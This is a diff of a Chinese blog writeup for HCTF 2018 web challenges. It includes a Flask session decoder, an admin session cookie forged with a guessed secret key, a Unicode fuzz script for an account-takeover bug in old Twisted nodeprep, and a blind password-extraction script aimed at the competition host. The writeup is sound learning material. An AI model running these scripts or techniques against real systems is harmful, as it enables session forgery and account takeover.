-            return render_template(&apos;index.html&apos;,forbidden = 1) 
-        if &apos;username&apos; in session: 
-            return render_template(&apos;index.html&apos;, user =session[&apos;username&apos;], flag =flag.flag)
+        error = request.args.get(&#39;error&#39;, &#39;&#39;) 
+        if (error ==&#39;1&#39;): 
+            session.pop(&#39;username&#39;, None) 
+            return render_template(&#39;index.html&#39;,forbidden = 1) 
+        if &#39;username&#39; in session: 
+            return render_template(&#39;index.html&#39;, user =session[&#39;username&#39;], flag =flag.flag)
         else :
-            return render_template(&apos;index.html&apos;)
+            return render_template(&#39;index.html&#39;)
 </code></pre><p>flag 渲染在 index.html 中，我们先看一下 /app/hard_t0_guess_n9f5a95b5ku9fg/templates/index.html</p>
 <p><strong>如图所示：</strong></p>
 <p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/HCTF2018%20hide_and_seek2.png" alt="此处输入图片的描述"></p>
@@ -421,7 +421,7 @@ def index():
 <p>Flask-Images（内部可能是图片处理用到的） Cookies相关的 Flask-WTF的CSRF保护</p>
 </blockquote>
 <p>那么我们再观察一下代码，发现</p>
-<pre><code>app.run(host = &apos;127.0.0.1&apos;, debug =True, port = 10008)
+<pre><code>app.run(host = &#39;127.0.0.1&#39;, debug =True, port = 10008)
 </code></pre><p>debug = True ,记的有一个漏洞是在 debug 模式开启的情况下，预测 PIN 码，配合任意文件读取实现任意代码执行，当然这里好像行不通，我们还是看一下随机数</p>
 <p>uuid.getnode() 这部分内容就是机器的MAC 地址转化成10进制后的结果，我们读 /sys/class/net/eth0/address 得到</p>
 <pre><code>12:34:3e:14:7c:62 =====&gt; 20015589129314
@@ -446,30 +446,30 @@ from flask.sessions import session_json_serializer
 from itsdangerous import base64_decode
 
 def decryption(payload):
-    payload, sig = payload.rsplit(b&apos;.&apos;, 1)        # 分离hmac签名 
-    payload, timestamp = payload.rsplit(b&apos;.&apos;, 1)  # 分离时间戳和 json
+    payload, sig = payload.rsplit(b&#39;.&#39;, 1)        # 分离hmac签名 
+    payload, timestamp = payload.rsplit(b&#39;.&#39;, 1)  # 分离时间戳和 json
 
     decompress = False                            # 判断是否经过了 zlib 的压缩
-    if payload.startswith(b&apos;.&apos;):
+    if payload.startswith(b&#39;.&#39;):
         payload = payload[1:]
         decompress = True
 
     try:
         payload = base64_decode(payload)
     except Exception as e:
-        raise Exception(&apos;Could not base64 decode the payload because of &apos;
-                         &apos;an exception&apos;)
+        raise Exception(&#39;Could not base64 decode the payload because of &#39;
+                         &#39;an exception&#39;)
 
     if decompress:
         try:
             payload = zlib.decompress(payload)
         except Exception as e:
-            raise Exception(&apos;Could not zlib decompress the payload before &apos;
-                             &apos;decoding the payload&apos;)
+            raise Exception(&#39;Could not zlib decompress the payload before &#39;
+                             &#39;decoding the payload&#39;)
 
     return session_json_serializer.loads(payload)
 
-if __name__ == &apos;__main__&apos;:
+if __name__ == &#39;__main__&#39;:
     print(decryption(sys.argv[1].encode()))
 </code></pre><p>到现在实际上我们就能使用一个 github 上面的伪造 flask_session 的工具进行伪造了</p>
 <p><strong>下面附上工具</strong></p>
@@ -483,11 +483,11 @@ Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;licen
 &gt;&gt;&gt; random.random()
 0.11935137566861131
 &gt;&gt;&gt; str(random.random()*100)
-&apos;11.9351375669&apos;
+&#39;11.9351375669&#39;
 
 
 
-root@K0rz3n:~# python session_cookie_manager.py encode -s &apos;11.9351375669&apos; -t &apos;{&quot;username&quot;:&quot;admin&quot;}&apos;
+root@K0rz3n:~# python session_cookie_manager.py encode -s &#39;11.9351375669&#39; -t &#39;{&quot;username&quot;:&quot;admin&quot;}&#39;
 eyJ1c2VybmFtZSI6eyIgYiI6IllXUnRhVzQ9In19.W-1S6Q.QlWfL5jyrKC_9sKMlA6PWE5-HCg
 </code></pre><p>getflag</p>
 <h2 id="0X04-admin"><a href="#0X04-admin" class="headerlink" title="0X04 admin"></a><strong>0X04 admin</strong></h2><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/HCTF2018%20admin1.png" alt="此处输入图片的描述"></p>
@@ -496,36 +496,36 @@ eyJ1c2VybmFtZSI6eyIgYiI6IllXUnRhVzQ9In19.W-1S6Q.QlWfL5jyrKC_9sKMlA6PWE5-HCg
 <p>题目给了源码</p>
 <p><a href="https://github.com/woadsl1234/hctf_flask/" target="_blank" rel="noopener">https://github.com/woadsl1234/hctf_flask/</a></p>
 <p>这里面在 routes.py 里面有一个值得注意的地方，在 Login 的时候 Name 被 strlower 了一次，给了 session[‘name’]</p>
-<pre><code>@app.route(&apos;/login&apos;, methods = [&apos;GET&apos;, &apos;POST&apos;])
+<pre><code>@app.route(&#39;/login&#39;, methods = [&#39;GET&#39;, &#39;POST&#39;])
 def login():
     if current_user.is_authenticated:
-        return redirect(url_for(&apos;index&apos;))
+        return redirect(url_for(&#39;index&#39;))
 
     form = LoginForm()
-    if request.method == &apos;POST&apos;:
+    if request.method == &#39;POST&#39;:
         name = strlower(form.username.data)                             # name lower()
-        session[&apos;name&apos;] = name                                          # 存入 session
+        session[&#39;name&#39;] = name                                          # 存入 session
         user = User.query.filter_by(username=name).first()
         if user is None or not user.check_password(form.password.data):
-            flash(&apos;Invalid username or password&apos;)
-            return redirect(url_for(&apos;login&apos;))
+            flash(&#39;Invalid username or password&#39;)
+            return redirect(url_for(&#39;login&#39;))
         login_user(user, remember=form.remember_me.data)
-        return redirect(url_for(&apos;index&apos;))
-    return render_template(&apos;login.html&apos;, title = &apos;login&apos;, form = form)
+        return redirect(url_for(&#39;index&#39;))
+    return render_template(&#39;login.html&#39;, title = &#39;login&#39;, form = form)
 </code></pre><p>然后在 change password 的逻辑中又 strlower 了一次</p>
-<pre><code>@app.route(&apos;/change&apos;, methods = [&apos;GET&apos;, &apos;POST&apos;])
+<pre><code>@app.route(&#39;/change&#39;, methods = [&#39;GET&#39;, &#39;POST&#39;])
 def change():
     if not current_user.is_authenticated:
-        return redirect(url_for(&apos;login&apos;))
+        return redirect(url_for(&#39;login&#39;))
     form = NewpasswordForm()
-    if request.method == &apos;POST&apos;:
-        name = strlower(session[&apos;name&apos;])                      # 登陆以后第二次 Lower()
+    if request.method == &#39;POST&#39;:
+        name = strlower(session[&#39;name&#39;])                      # 登陆以后第二次 Lower()
         user = User.query.filter_by(username=name).first()
         user.set_password(form.newpassword.data)
         db.session.commit()
-        flash(&apos;change successful&apos;)
-        return redirect(url_for(&apos;index&apos;))
-    return render_template(&apos;change.html&apos;, title = &apos;change&apos;, form = form)
+        flash(&#39;change successful&#39;)
+        return redirect(url_for(&#39;index&#39;))
+    return render_template(&#39;change.html&#39;, title = &#39;change&#39;, form = form)
 </code></pre><p>我们要以 admin 的身份登录进去，也就是我们要重置 admin 的密码，这种情况我们唯一的解决办法就是构造一个字符串，然后让其在两次 strlower() 后变成 admin，(赛后看 wp 还有一种思路就是我们可以利用 flask 的 客户端 session 机制来伪造 session 为 admin 成功登录)</p>
 <p>但是直接在命令行执行 strlower() 说没有这个函数，后来发现这个函数是作者自己定义的一个，定义如下：</p>
 <pre><code>def strlower(username):
@@ -534,10 +534,10 @@ def change():
 </code></pre><p>strlower() 底层调用了一个 nodeprep.prepare() 函数，我查了一下这个函数的归属，发现属于 twisted ，那我们的重点就转向了这个函数了，后来找到了一篇文章 <a href="https://labs.spotify.com/2013/06/18/creative-usernames/" target="_blank" rel="noopener">https://labs.spotify.com/2013/06/18/creative-usernames/</a></p>
 <p>这里说明了 twisted 老版本的一个字符串解析漏洞，我看了一下 requirements.txt twisted 的版本还是 10.2.0 那就无疑了</p>
 <p>根据上面这篇文章的攻击链</p>
-<pre><code>&gt;&gt;&gt; canonical_username(u&apos;\u1d2e\u1d35\u1d33\u1d2e\u1d35\u1d3f\u1d30&apos;)
-u&apos;BIGBIRD&apos;
-&gt;&gt;&gt; canonical_username(canonical_username(u&apos;\u1d2e\u1d35\u1d33\u1d2e\u1d35\u1d3f\u1d30&apos;))
-u&apos;bigbird&apos;
+<pre><code>&gt;&gt;&gt; canonical_username(u&#39;\u1d2e\u1d35\u1d33\u1d2e\u1d35\u1d3f\u1d30&#39;)
+u&#39;BIGBIRD&#39;
+&gt;&gt;&gt; canonical_username(canonical_username(u&#39;\u1d2e\u1d35\u1d33\u1d2e\u1d35\u1d3f\u1d30&#39;))
+u&#39;bigbird&#39;
 </code></pre><p>我们很容易想到我们自己的攻击链</p>
 <p>我们注册的时候使用 unicode 字符注册，比如 ᴀdmin,然后经过一次 strlower() 编程 Admin ,然后我们修改密码，这时候又会进行一次 strlower() 这样我们就能重置 admin 的密码了</p>
 <p>py2 中有一个非常好用的函数 unichr() 我们可以利用这个函数进行 fuzz</p>
@@ -551,15 +551,15 @@ dic = {}
 
 for i in xrange(1,100000):
     try:
-        if(fuzz(unichr(i)) == &apos;a&apos;):
+        if(fuzz(unichr(i)) == &#39;a&#39;):
             dic[i] = unichr(i)
     except:
         pass
 
 print dic
 </code></pre><p><strong>结果：</strong></p>
-<pre><code>{65: u&apos;A&apos;, 7491: u&apos;\u1d43&apos;, 9424: u&apos;\u24d0&apos;, 97: u&apos;a&apos;, 170: u&apos;\xaa&apos;, 7468: u&apos;\u1d2c&apos;, 8336: u&apos;\u2090&apos;, 9398: u&apos;\u24b6&apos;, 65313: u&apos;\uff21&apos;, 65345:
- u&apos;\uff41&apos;}
+<pre><code>{65: u&#39;A&#39;, 7491: u&#39;\u1d43&#39;, 9424: u&#39;\u24d0&#39;, 97: u&#39;a&#39;, 170: u&#39;\xaa&#39;, 7468: u&#39;\u1d2c&#39;, 8336: u&#39;\u2090&#39;, 9398: u&#39;\u24b6&#39;, 65313: u&#39;\uff21&#39;, 65345:
+ u&#39;\uff41&#39;}
 </code></pre><p>这个脚本只是尝试一个字母的，可以看到还是有不少的选择，然后按照供给链进行就可以了</p>
 <h2 id="0X05-GAME"><a href="#0X05-GAME" class="headerlink" title="0X05 GAME"></a><strong>0X05 GAME</strong></h2><p>一个登录框</p>
 <p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/HCTF2018%20game1.png" alt="此处输入图片的描述"></p>
@@ -591,12 +591,12 @@ def catch(num,str1):
             tmp=&quot;0&quot;+tmp
         str2=str1+&quot;%&quot;+tmp
         print str2
-        usernew = &apos;&apos;.join(random.sample(string.ascii_letters + string.digits, 13))
+        usernew = &#39;&#39;.join(random.sample(string.ascii_letters + string.digits, 13))
         url=&quot;http://game.2018.hctf.io/web2/action.php?action=reg&quot;
-        data = &apos;username=%s&amp;password=%s&amp;sex=1&amp;submit=submit&apos; %  (usernew,str2)
+        data = &#39;username=%s&amp;password=%s&amp;sex=1&amp;submit=submit&#39; %  (usernew,str2)
         headers={&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}
-        #data={&quot;username&quot;:&quot;admin&apos;&amp;&amp;mid(password,%d,1)=&apos;%s&apos;#&quot; % (num,str),&quot;password&quot;:&quot;1&quot;} 
-        #strings=&quot;aaaaaaaa&apos; or mid(username,1,1)=&apos;a&apos; and &apos;1&quot;
+        #data={&quot;username&quot;:&quot;admin&#39;&amp;&amp;mid(password,%d,1)=&#39;%s&#39;#&quot; % (num,str),&quot;password&quot;:&quot;1&quot;} 
+        #strings=&quot;aaaaaaaa&#39; or mid(username,1,1)=&#39;a&#39; and &#39;1&quot;
         #print url
         #正常用法
         r=requests.post(url,data=data,headers=headers)
@@ -604,8 +604,8 @@ def catch(num,str1):
         #用于burp调试
         #r=requests.get(url,headers=header,proxies={&quot;http&quot;:&quot;127.0.0.1:8080&quot;})
         #print r.content
-        sss = requests.get(&apos;http://game.2018.hctf.io/web2/user.php?order=password&apos;,headers={&quot;Cookie&quot;:&quot;PHPSESSID=p9op1amllrobs6okqfkih2vr40&quot;}).content
-        index1= sss.index(&apos;&lt;tr&gt;\n\t\t\t\t\t\t&lt;td&gt;\n\t\t\t\t\t\t\t1\n\t\t\t\t\t\t&lt;/td&gt;\n\t\t\t\t\t\t&lt;td&gt;\n\t\t\t\t\t\t\tadmin&apos;)
+        sss = requests.get(&#39;http://game.2018.hctf.io/web2/user.php?order=password&#39;,headers={&quot;Cookie&quot;:&quot;PHPSESSID=p9op1amllrobs6okqfkih2vr40&quot;}).content
+        index1= sss.index(&#39;&lt;tr&gt;\n\t\t\t\t\t\t&lt;td&gt;\n\t\t\t\t\t\t\t1\n\t\t\t\t\t\t&lt;/td&gt;\n\t\t\t\t\t\t&lt;td&gt;\n\t\t\t\t\t\t\tadmin&#39;)
         print usernew
         index2=sss.index(usernew)
         print index1
@@ -623,9 +623,9 @@ def catch(num,str1):
 if __name__ == &quot;__main__&quot;:
     #payloads = list(string.ascii_lowercase)
     #payloads.append(&quot;_;&quot;)
-    payloads=&apos;!&quot;#$%&amp;\&apos;()*+,-./:;&lt;=&gt;?@0123456789abcdefghijklmnopqrstuvwxyz[\\]^_`{|}~&apos;
-    #payloads = list(&apos;sysadmin:0123456789_abcdefghijklmnopqrstuvwxyz ,ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&apos;)
-    user=&apos;%44%53%41%38%26%26%21%40%23%24%25&apos;
+    payloads=&#39;!&quot;#$%&amp;\&#39;()*+,-./:;&lt;=&gt;?@0123456789abcdefghijklmnopqrstuvwxyz[\\]^_`{|}~&#39;
+    #payloads = list(&#39;sysadmin:0123456789_abcdefghijklmnopqrstuvwxyz ,ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;)
+    user=&#39;%44%53%41%38%26%26%21%40%23%24%25&#39;
     for i in range(1,100):
         user = user+catch(i,user)
         print &quot;now user is &quot;+user
@@ -641,7 +641,7 @@ def md5(str):
     return encrypts
 
 def reg(username,password):
-    url = &apos;http://game.2018.hctf.io/web2/action.php?action=reg&apos;
+    url = &#39;http://game.2018.hctf.io/web2/action.php?action=reg&#39;
     data = {
         &quot;username&quot;:username,
         &quot;password&quot;:password,
@@ -649,18 +649,18 @@ def reg(username,password):
         &quot;submit&quot;:&quot;submit&quot;
     }
     headers = {
-        &apos;Connection&apos;: &apos;close&apos;,
+        &#39;Connection&#39;: &#39;close&#39;,
     }
     r = requests.post(url=url,data=data,headers=headers)
 
 def fuzz(start,end):
     for i in range(start,end):
-        password = &apos;dSa8&amp;&amp;!@#$%^&amp;d1nGy1aS3dja&apos;+chr(i)
+        password = &#39;dSa8&amp;&amp;!@#$%^&amp;d1nGy1aS3dja&#39;+chr(i)
         username=md5(password)
         content = username + &quot; &quot; + password +&quot; &quot;+ str(i) + &quot;\n&quot;
         reg(username, password)
         print content
-    print str(start)+&apos;~&apos;+str(end)+&quot;complete&quot;
+    print str(start)+&#39;~&#39;+str(end)+&quot;complete&quot;
 
 step=20
 for i in range(33,127,step):
@@ -674,4 +674,4 @@ for i in range(33,127,step):
 <p>(1)一种是使用空的 location ，这种情况不发生跳转<br>(2)另一种是在 firefox 中使用端口号 0 来使其不跳转（这种方式只在 firefox 中可用）</p>
 <p>这次的题目也已经提示使用的是 firefox 这种 Bot ,于是我们就能直接利用这种方式，当然这里还有一些小的技巧，比如控制一些 X-XSS-Protection 为 0, Content-Type 为 text/html 或者是 Content-Length 等，最后拿到 cookie 就能改 cookie 登录了。</p>
 <h2 id="0X07-参考"><a href="#0X07-参考" class="headerlink" title="0X07 参考"></a><strong>0X07 参考</strong></h2><p><a href="http://l-team.org/archives/hcft2018.html" target="_blank" rel="noopener">http://l-team.org/archives/hcft2018.html</a><br><a href="https://bysec.io/hctf/writeup.html" target="_blank" rel="noopener">https://bysec.io/hctf/writeup.html</a><br><a href="https://xz.aliyun.com/t/3253" target="_blank" rel="noopener">https://xz.aliyun.com/t/3253</a><br><a href="https://xz.aliyun.com/t/3245" target="_blank" rel="noopener">https://xz.aliyun.com/t/3245</a><br><a href="https://xz.aliyun.com/t/3242" target="_blank" rel="noopener">https://xz.aliyun.com/t/3242</a><br><a href="https://xz.aliyun.com/t/3255" target="_blank" rel="noopener">https://xz.aliyun.com/t/3255</a><br><a href="https://labs.spotify.com/2013/06/18/creative-usernames/" target="_blank" rel="noopener">https://labs.spotify.com/2013/06/18/creative-usernames/</a><br><a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html</a><br><a href="https://www.anquanke.com/post/id/163975" target="_blank" rel="noopener">https://www.anquanke.com/post/id/163975</a><br><a href="https://www.anquanke.com/post/id/163975" target="_blank" rel="noopener">https://www.anquanke.com/post/id/163975</a><br><a href="https://www.leavesongs.com/PENETRATION/Sina-CRLF-Injection.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/Sina-CRLF-Injection.html</a></p>
-</div><script type="text/javascript" src="/js/share.js?v=1.0.4" async></script><a data-url="https://www.k0rz3n.com/2018/11/20/HCTF 2018 web 部分题目 详细 writeup/" data-id="cjv7v4tdq009evgv8onetdovj" class="article-share-link">Aktie</a><div class="tags"><a href="/tags/CTF-writeup/">CTF writeup</a></div><div class="post-nav"><a href="/2018/11/21/LCTF 2018 部分 web 题 writeup/" class="pre">LCTF 2018 部分 web 题详细 writeup</a><a href="/2018/11/20/一篇文章带你理解漏洞之 PHP 文件包含漏洞/" class="next">一篇文章带你理解漏洞之 PHP 文件包含漏洞</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="side_toc"><div style="position:fixed" class="toc-article"><div class="toc-title">Inhalte</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0X00-前言"><span class="toc-number">1.</span> <span class="toc-text">0X00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X01-warmup"><span class="toc-number">2.</span> <span class="toc-text">0X01 warmup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X02-Kzone"><span class="toc-number">3.</span> <span class="toc-text">0X02 Kzone</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X03-hide-and-seek"><span class="toc-number">4.</span> <span class="toc-text">0X03 hide_and_seek</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X04-admin"><span class="toc-number">5.</span> <span class="toc-text">0X04 admin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X05-GAME"><span class="toc-number">6.</span> <span class="toc-text">0X05 GAME</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X06-bottle"><span class="toc-number">7.</span> <span class="toc-text">0X06 bottle</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X07-参考"><span class="toc-number">8.</span> <span class="toc-text">0X07 参考</span></a></li></ol></div></div></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2019 <a href="/." rel="nofollow">K0rz3n's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/byoungd/pure"> Pure Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/byoungd"> byoungd.</a></div></div><a id="rocket" href="#top" class="show"></a><script type="text/javascript" src="/js/totop.js?v=1.0.4" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.0.47/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=1.0.4" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.0.47/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=1.0.4"></script><script type="text/javascript" src="/js/smartresize.js?v=1.0.4"></script><script type="text/javascript" src="/js/prism.js?v=1.0.4"></script></div></body></html>
+</div><div class="tags"><a href="/tags/CTF-writeup/">CTF writeup</a></div><div class="post-nav"><a class="pre" href="/2018/11/21/LCTF 2018 部分 web 题 writeup/">LCTF 2018 部分 web 题详细 writeup</a><a class="next" href="/2018/11/20/一篇文章带你理解漏洞之 PHP 文件包含漏洞/">一篇文章带你理解漏洞之 PHP 文件包含漏洞</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="https://www.k0rz3n.com"></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> Kategorien</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/APT/">APT</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/C-C/">C&C</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Kerberos/">Kerberos</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/learning/">learning</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/php/">php</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web安全/">web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/wireshark/">wireshark</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/备忘/">备忘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/备忘-笔记/">备忘 笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/学习思考/">学习思考</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具/">工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具使用/">工具使用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/开发/">开发</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/">渗透测试</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞分析/">漏洞分析</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞研究/">漏洞研究</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/环境搭建/">环境搭建</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/翻译/">翻译</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/论文/">论文</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/随笔/">随笔</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"><a href="/tags/渗透测试-技巧/" style="font-size: 15px;">渗透测试 技巧</a> <a href="/tags/工具-渗透测试/" style="font-size: 15px;">工具 渗透测试</a> <a href="/tags/备忘-反向代理-配置/" style="font-size: 15px;">备忘 反向代理 配置</a> <a href="/tags/开发-Github-备忘/" style="font-size: 15px;">开发 Github 备忘</a> <a href="/tags/配置-备忘/" style="font-size: 15px;">配置 备忘</a> <a href="/tags/Linux-渗透测试-备忘/" style="font-size: 15px;">Linux 渗透测试 备忘</a> <a href="/tags/编程-Python-进阶-备忘/" style="font-size: 15px;">编程 Python 进阶 备忘</a> <a href="/tags/网络安全-Python语法/" style="font-size: 15px;">网络安全 Python语法</a> <a href="/tags/learning/" style="font-size: 15px;">learning</a> <a href="/tags/gcc-备忘-笔记/" style="font-size: 15px;">gcc 备忘 笔记</a> <a href="/tags/Windows-FTP搭建-备忘/" style="font-size: 15px;">Windows FTP搭建 备忘</a> <a href="/tags/学习发现/" style="font-size: 15px;">学习发现</a> <a href="/tags/CTF-Tools/" style="font-size: 15px;">CTF Tools</a> <a href="/tags/笔记/" style="font-size: 15px;">笔记</a> <a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/kali/" style="font-size: 15px;">kali</a> <a href="/tags/SQL/" style="font-size: 15px;">SQL</a> <a href="/tags/php/" style="font-size: 15px;">php</a> <a href="/tags/网络安全-Google-Hacking-信息收集-渗透测试/" style="font-size: 15px;">网络安全 Google Hacking 信息收集 渗透测试</a> <a href="/tags/J2EE-基础/" style="font-size: 15px;">J2EE 基础</a> <a href="/tags/前端/" style="font-size: 15px;">前端</a> <a href="/tags/随笔/" style="font-size: 15px;">随笔</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/web安全-漏洞-CTF/" style="font-size: 15px;">web安全  漏洞  CTF</a> <a href="/tags/PHP-备忘-笔记/" style="font-size: 15px;">PHP 备忘 笔记</a> <a href="/tags/渗透测试-windows-后门/" style="font-size: 15px;">渗透测试 windows 后门</a> <a href="/tags/sql/" style="font-size: 15px;">sql</a> <a href="/tags/php语法/" style="font-size: 15px;">php语法</a> <a href="/tags/wireshark/" style="font-size: 15px;">wireshark</a> <a href="/tags/编程/" style="font-size: 15px;">编程</a> <a href="/tags/Linux-备忘/" style="font-size: 15px;">Linux 备忘</a> <a href="/tags/备忘/" style="font-size: 15px;">备忘</a> <a href="/tags/备忘-shell-Linux/" style="font-size: 15px;">备忘 shell Linux</a> <a href="/tags/工具使用/" style="font-size: 15px;">工具使用</a> <a href="/tags/网络安全-渗透测试-内网代理/" style="font-size: 15px;">网络安全 渗透测试 内网代理</a> <a href="/tags/渗透测试-局域网扫描/" style="font-size: 15px;">渗透测试 局域网扫描</a> <a href="/tags/备忘-dcoker-getshell-CTF/" style="font-size: 15px;">备忘 dcoker getshell CTF</a> <a href="/tags/APT/" style="font-size: 15px;">APT</a> <a href="/tags/网络安全-渗透测试-sqlmap/" style="font-size: 15px;">网络安全 渗透测试 sqlmap</a> <a href="/tags/静态检测/" style="font-size: 15px;">静态检测</a> <a href="/tags/转载/" style="font-size: 15px;">转载</a> <a href="/tags/Fuzz-XSS/" style="font-size: 15px;">Fuzz XSS</a> <a href="/tags/笔记-协议分析/" style="font-size: 15px;">笔记 协议分析</a> <a href="/tags/Redis-备忘/" style="font-size: 15px;">Redis 备忘</a> <a href="/tags/web安全-CTF-渗透测试-PHP/" style="font-size: 15px;">web安全 CTF 渗透测试 PHP</a> <a href="/tags/CSP/" style="font-size: 15px;">CSP</a> <a href="/tags/Java-备忘-笔记/" style="font-size: 15px;">Java 备忘 笔记</a> <a href="/tags/域渗透/" style="font-size: 15px;">域渗透</a> <a href="/tags/JSONP/" style="font-size: 15px;">JSONP</a> <a href="/tags/编程-C-类库/" style="font-size: 15px;">编程 C++ 类库</a> <a href="/tags/java-备忘/" style="font-size: 15px;">java 备忘</a> <a href="/tags/web安全-CTF/" style="font-size: 15px;">web安全 CTF</a> <a href="/tags/CTF-writeup/" style="font-size: 15px;">CTF writeup</a> <a href="/tags/web安全-MySQL-渗透测试/" style="font-size: 15px;">web安全 MySQL 渗透测试</a> <a href="/tags/编程-PHP-基础/" style="font-size: 15px;">编程 PHP 基础</a> <a href="/tags/网络安全-沙盒逃逸-Python/" style="font-size: 15px;">网络安全 沙盒逃逸 Python</a> <a href="/tags/SQL-语法/" style="font-size: 15px;">SQL 语法</a> <a href="/tags/web安全-漏洞分析/" style="font-size: 15px;">web安全 漏洞分析</a> <a href="/tags/网络安全-钓鱼-恶意代码分析-漏洞分析/" style="font-size: 15px;">网络安全 钓鱼 恶意代码分析 漏洞分析</a> <a href="/tags/漏洞研究/" style="font-size: 15px;">漏洞研究</a> <a href="/tags/密码学-网络协议/" style="font-size: 15px;">密码学 网络协议</a> <a href="/tags/fuzz/" style="font-size: 15px;">fuzz</a> <a href="/tags/编程-PHP-进阶/" style="font-size: 15px;">编程 PHP 进阶</a> <a href="/tags/Fuzz/" style="font-size: 15px;">Fuzz</a> <a href="/tags/爬虫/" style="font-size: 15px;">爬虫</a> <a href="/tags/符号执行/" style="font-size: 15px;">符号执行</a> <a href="/tags/XSS/" style="font-size: 15px;">XSS</a> <a href="/tags/编程-JAVA-基础/" style="font-size: 15px;">编程 JAVA 基础</a> <a href="/tags/污点分析/" style="font-size: 15px;">污点分析</a> <a href="/tags/PHP-静态检测/" style="font-size: 15px;">PHP 静态检测</a> <a href="/tags/Windows-批处理-备忘/" style="font-size: 15px;">Windows 批处理 备忘</a> <a href="/tags/SQL-注入/" style="font-size: 15px;">SQL 注入</a> <a href="/tags/流量分析/" style="font-size: 15px;">流量分析</a> <a href="/tags/编程-C-基础/" style="font-size: 15px;">编程 C++ 基础</a> <a href="/tags/编程-进阶/" style="font-size: 15px;">编程 进阶</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Letzte</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/05/03/Python3 爬虫知识梳理(基础篇)/">Python3 爬虫知识梳理(基础篇)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/29/New Page ,New Future/">New Page,New Future</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/20/JAVA 泛型、动态代理技术要点梳理/">JAVA 泛型、动态代理技术要点梳理</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/04/TCTF 2019 线上赛 web 题 writeup/">TCTF 2019 线上赛 web 题 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/23/2018 APT (Advanced Persistent Threat)攻击大事件/">2018 APT (Advanced Persistent Threat)攻击大事件</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/21/APT(高级持续威胁) 概念以及趋势概述/">APT(高级持续威胁) 概念以及趋势概述</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/19/威胁情报概念与APT事件分析模型概述/">威胁情报概念与APT事件分析模型概述</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/17/浅析 Kerberos 认证过程以及黄金票据和白银票据/">浅析 Kerberos 认证过程以及黄金票据和白银票据</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/13/C&C控制服务的设计和侦测方法综述(Drops from wooyun)/">C&C控制服务的设计和侦测方法综述(Drops from wooyun)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/09/如何使用 DOM XSS 来绕过 CSP 的 nonces 机制(半机翻有删增)/">如何使用 DOM XSS 来绕过 CSP 的 nonces 机制(半机翻有删增)</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 